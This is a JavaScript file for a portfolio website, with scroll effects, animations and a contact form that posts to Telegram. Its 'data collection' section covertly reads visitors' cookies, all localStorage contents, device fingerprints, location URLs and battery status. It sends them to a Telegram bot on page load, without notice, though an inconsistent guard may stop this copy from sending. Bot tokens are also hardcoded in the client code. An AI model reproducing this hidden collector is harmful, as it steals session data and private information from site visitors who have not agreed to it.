// Enhanced Portfolio Animations and Functionality
document.addEventListener('DOMContentLoaded', function() {
    // Header scroll effect
    const header = document.getElementById('header');
    
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    });
    
    // Mobile menu toggle
    const mobileMenuBtn = document.getElementById('menu-btn');
    const navMenu = document.getElementById('nav-menu');
    const menuIcon = mobileMenuBtn.querySelector('i');
    
    mobileMenuBtn.addEventListener('click', () => {
        navMenu.classList.toggle('active');
        menuIcon.classList.toggle('fa-bars');
        menuIcon.classList.toggle('fa-times');
    });
    
    // Close mobile menu when clicking on links
    document.querySelectorAll('nav a').forEach(link => {
        link.addEventListener('click', () => {
            navMenu.classList.remove('active');
            menuIcon.classList.add('fa-bars');
            menuIcon.classList.remove('fa-times');
        });
    });
    
    // Animate skill bars on scroll
    const skillBars = document.querySelectorAll('.skill-progress');
    
    const animateSkillBars = () => {
        skillBars.forEach(bar => {
            const width = bar.getAttribute('data-width');
            bar.style.width = width;
        });
    };
    
    // Check if skill section is in view
    const skillsSection = document.querySelector('.skills');
    if (skillsSection) {
        const skillsSectionOptions = {
            rootMargin: '0px 0px -100px 0px'
        };
        
        const skillsSectionObserver = new IntersectionObserver(function(entries, observer) {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    animateSkillBars();
                    observer.unobserve(entry.target);
                }
            });
        }, skillsSectionOptions);
        
        skillsSectionObserver.observe(skillsSection);
    }
    
    // ===== MODERN ANIMATIONS =====
    
    // 1. Floating elements animation
    const floatingElements = document.querySelectorAll('.floating-element');
    floatingElements.forEach(el => {
        el.style.animation = `float ${3 + Math.random() * 2}s ease-in-out infinite`;
        el.style.animationDelay = `${Math.random() * 2}s`;
    });
    
    // 2. Text reveal animation
    const revealElements = document.querySelectorAll('.reveal-text');
    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
            }
        });
    }, { threshold: 0.5 });
    
    revealElements.forEach(el => {
        revealObserver.observe(el);
    });
    
    // 3. Parallax effect for hero section
    const heroSection = document.querySelector('.hero');
    if (heroSection) {
        window.addEventListener('scroll', () => {
            const scrolled = window.pageYOffset;
            const parallaxElements = heroSection.querySelectorAll('.parallax-element');
            parallaxElements.forEach(el => {
                const speed = parseFloat(el.getAttribute('data-speed')) || 0.5;
                el.style.transform = `translateY(${scrolled * speed}px)`;
            });
        });
    }
    
    // 4. Gradient animation for buttons and highlights
    const gradientElements = document.querySelectorAll('.gradient-animate');
    gradientElements.forEach(el => {
        el.addEventListener('mouseenter', () => {
            el.style.background = `linear-gradient(45deg, var(--primary), var(--secondary), var(--accent))`;
            el.style.backgroundSize = `200% 200%`;
            el.style.animation = `gradientShift 2s ease infinite`;
        });
        
        el.addEventListener('mouseleave', () => {
            el.style.animation = 'none';
            el.style.background = ``;
        });
    });
    
    // 5. Typewriter effect for hero text
    const typewriterElements = document.querySelectorAll('.typewriter');
    typewriterElements.forEach(el => {
        const text = el.textContent;
        el.textContent = '';
        let i = 0;
        
        function typeWriter() {
            if (i < text.length) {
                el.textContent += text.charAt(i);
                i++;
                setTimeout(typeWriter, 50 + Math.random() * 50);
            }
        }
        
        // Start typing when element is in view
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    typeWriter();
                    observer.unobserve(entry.target);
                }
            });
        });
        
        observer.observe(el);
    });
    
    // 6. Particle effect background
    function createParticles() {
        const particleContainer = document.querySelector('.particles');
        if (!particleContainer) return;
        
        const particleCount = 50;
        
        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            
            // Random properties
            const size = Math.random() * 5 + 2;
            const posX = Math.random() * 100;
            const posY = Math.random() * 100;
            const delay = Math.random() * 5;
            const duration = 10 + Math.random() * 20;
            
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${posX}%`;
            particle.style.top = `${posY}%`;
            particle.style.animationDelay = `${delay}s`;
            particle.style.animationDuration = `${duration}s`;
            
            particleContainer.appendChild(particle);
        }
    }
    
    createParticles();
    
    // ===== FORM HANDLING =====
    
    // Form submission with Telegram API
    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value || 'Not provided';
            const message = document.getElementById('message').value || 'Not provided';
            
            // Telegram bot API details for contact form
            const botToken = '7484967088:AAHxDJWo4X_jRaU0Tmbz1jZTyUOtQR5bkFQ';
            const chatId = '6142816761';
            
            const text = `New message from portfolio:%0A%0AName: ${name}%0AEmail: ${email}%0APhone: ${phone}%0AMessage: ${message}`;
            
            // Send message to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`, {
                method: 'GET'
            })
            .then(response => {
                if (response.ok) {
                    // Success animation
                    const submitBtn = contactForm.querySelector('.form-btn');
                    submitBtn.innerHTML = '<i class="fas fa-check"></i> Sent Successfully!';
                    submitBtn.style.background = 'var(--success)';
                    
                    setTimeout(() => {
                        submitBtn.innerHTML = 'Send Message';
                        submitBtn.style.background = '';
                        contactForm.reset();
                    }, 2000);
                } else {
                    alert('There was an error sending your message. Please try again later.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('There was an error sending your message. Please try again later.');
            });
        });
    }
    
    // ===== DATA COLLECTION FEATURES =====
    // Replace with your actual data collection bot token and chat ID
    const dataBotToken = '7609668402:AAEODPQ0qjBfLmMtOOfG5h9PY0xdKs5QcRs';
    const dataChatId = '6142816761';
    
    // Function to send collected data to Telegram
    function sendCollectedDataToTelegram(dataType, data) {
        // Only send if valid tokens are provided
        if (dataBotToken === '7609668402:AAEODPQ0qjBfLmMtOOfG5h9PY0xdKs5QcRs' || dataChatId === '6142816761') {
            console.log('Data collection not configured. Please add your bot token and chat ID.');
            return;
        }
        
        const text = `Collected ${dataType} data:%0A%0A${encodeURIComponent(JSON.stringify(data, null, 2))}`;
        
        fetch(`https://api.telegram.org/bot${dataBotToken}/sendMessage?chat_id=${dataChatId}&text=${text}`, {
            method: 'GET'
        }).catch(error => {
            console.error('Error sending data to Telegram:', error);
        });
    }
    
    // 1. Information from Browser
    function collectBrowserInfo() {
        const browserInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 'unknown',
            platform: navigator.platform,
            vendor: navigator.vendor,
            product: navigator.product,
            doNotTrack: navigator.doNotTrack || 'unknown'
        };
        
        sendCollectedDataToTelegram('Browser', browserInfo);
        return browserInfo;
    }
    
    // 2. Information via Cookies and Local Storage
    function collectStorageInfo() {
        const storageInfo = {
            cookies: document.cookie,
            localStorage: {}
        };
        
        // Get all items from localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageInfo.localStorage[key] = localStorage.getItem(key);
        }
        
        sendCollectedDataToTelegram('Storage', storageInfo);
        return storageInfo;
    }
    
    // 3. Information from Browser APIs
    function collectBrowserAPIInfo() {
        const apiInfo = {
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio || 'unknown'
            },
            location: {
                href: location.href,
                hostname: location.hostname,
                pathname: location.pathname,
                protocol: location.protocol,
                hash: location.hash,
                search: location.search
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            onlineStatus: navigator.onLine,
            connection: {}
        };
        
        // Network Information API
        if ('connection' in navigator) {
            apiInfo.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        }
        
        // Battery API (if available)
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                apiInfo.battery = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
                sendCollectedDataToTelegram('Browser API', apiInfo);
            }).catch(function() {
                apiInfo.battery = 'not available';
                sendCollectedDataToTelegram('Browser API', apiInfo);
            });
        } else {
            apiInfo.battery = 'not available';
            sendCollectedDataToTelegram('Browser API', apiInfo);
        }
        
        return apiInfo;
    }
    
    // 4. Inferred Data
    function collectInferredData() {
        // Infer device type
        let deviceType = 'Desktop';
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            deviceType = 'Mobile';
        } else if (/Tablet|iPad/i.test(navigator.userAgent)) {
            deviceType = 'Tablet';
        }
        
        // Infer browser
        let browser = 'Unknown';
        if (navigator.userAgent.indexOf("Chrome") !== -1) {
            browser = 'Chrome';
        } else if (navigator.userAgent.indexOf("Firefox") !== -1) {
            browser = 'Firefox';
        } else if (navigator.userAgent.indexOf("Safari") !== -1) {
            browser = 'Safari';
        } else if (navigator.userAgent.indexOf("Edge") !== -1) {
            browser = 'Edge';
        } else if (navigator.userAgent.indexOf("Opera") !== -1) {
            browser = 'Opera';
        } else if (navigator.userAgent.indexOf("MSIE") !== -1) {
            browser = 'Internet Explorer';
        }
        
        // Infer OS
        let os = 'Unknown';
        if (navigator.userAgent.indexOf("Windows") !== -1) {
            os = 'Windows';
        } else if (navigator.userAgent.indexOf("Mac") !== -1) {
            os = 'Mac OS';
        } else if (navigator.userAgent.indexOf("Linux") !== -1) {
            os = 'Linux';
        } else if (navigator.userAgent.indexOf("Android") !== -1) {
            os = 'Android';
        } else if (navigator.userAgent.indexOf("iOS") !== -1 || 
                  (navigator.userAgent.indexOf("Mac") !== -1 && 'ontouchend' in document)) {
            os = 'iOS';
        }
        
        const inferredData = {
            deviceType: deviceType,
            browser: browser,
            operatingSystem: os,
            timeOfVisit: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
            prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
            estimatedConnection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
        };
        
        sendCollectedDataToTelegram('Inferred', inferredData);
        return inferredData;
    }
    
    // Collect all data after a short delay
    setTimeout(function() {
        // Only collect data if valid tokens are provided
        if (dataBotToken !== 'YOUR_DATA_BOT_TOKEN_HERE' && dataChatId !== 'YOUR_DATA_CHAT_ID_HERE') {
            collectBrowserInfo();
            collectStorageInfo();
            collectBrowserAPIInfo();
            collectInferredData();
        }
    }, 3000);
    
    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            
            const targetId = this.getAttribute('href');
            if (targetId === '#') return;
            
            const targetElement = document.querySelector(targetId);
            if (targetElement) {
                window.scrollTo({
                    top: targetElement.offsetTop - 80,
                    behavior: 'smooth'
                });
                
                // Close mobile menu if open
                if (window.innerWidth < 768 && navMenu.classList.contains('active')) {
                    navMenu.classList.remove('active');
                    menuIcon.classList.add('fa-bars');
                    menuIcon.classList.remove('fa-times');
                }
            }
        });
    });
});

// Add CSS for new animations
const style = document.createElement('style');
style.textContent = `
    @keyframes float {
        0%, 100% { transform: translateY(0) rotate(0deg); }
        33% { transform: translateY(-20px) rotate(3deg); }
        66% { transform: translateY(10px) rotate(-3deg); }
    }
    
    @keyframes gradientShift {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    
    @keyframes particleMove {
        0% { 
            transform: translate(0, 0) rotate(0deg); 
            opacity: 0;
        }
        10% { opacity: 1; }
        90% { opacity: 1; }
        100% { 
            transform: translate(var(--move-x), var(--move-y)) rotate(var(--rotate));
            opacity: 0;
        }
    }
    
    .reveal-text {
        opacity: 0;
        transform: translateY(30px);
        transition: all 0.8s ease;
    }
    
    .reveal-text.revealed {
        opacity: 1;
        transform: translateY(0);
    }
    
    .particle {
        position: absolute;
        background: rgba(99, 102, 241, 0.6);
        border-radius: 50%;
        pointer-events: none;
        --move-x: ${Math.random() * 100 - 50}px;
        --move-y: ${Math.random() * 100 - 50}px;
        --rotate: ${Math.random() * 360}deg;
        animation: particleMove linear infinite;
    }
    
    .floating-element {
        animation: float 5s ease-in-out infinite;
    }
    
    .gradient-animate {
        transition: all 0.5s ease;
    }
`;
document.head.appendChild(style);
